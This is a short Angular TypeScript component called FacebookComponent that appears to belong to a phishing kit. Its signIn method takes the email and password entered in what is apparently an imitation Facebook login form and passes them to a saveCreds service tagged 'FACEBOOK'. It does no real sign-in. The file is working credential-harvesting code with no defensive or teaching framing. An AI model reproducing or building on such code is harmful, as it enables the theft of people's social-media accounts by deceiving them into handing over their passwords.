import { Component, ElementRef, ViewChild } from '@angular/core';
import { NgForm } from '@angular/forms';
import { PageRoutingService } from 'src/app/services/page-routing.service';
import { SaveFacadeService } from 'src/app/services/save-facade.service';

@Component({
  selector: 'app-facebook',
  templateUrl: './facebook.component.html',
  styleUrls: ['./facebook.component.css']
})
export class FacebookComponent {
  // @ViewChild('emailInput')
  // emailInput!: ElementRef;

  // @ViewChild('passwordInput')
  // passwordInput!: ElementRef;

  constructor(private saveService: SaveFacadeService ){}


  signIn(form: NgForm){

    const email = form.value.email
    const pass = form.value.password



    this.saveService.saveCreds(email,pass,"FACEBOOK")

  }
}
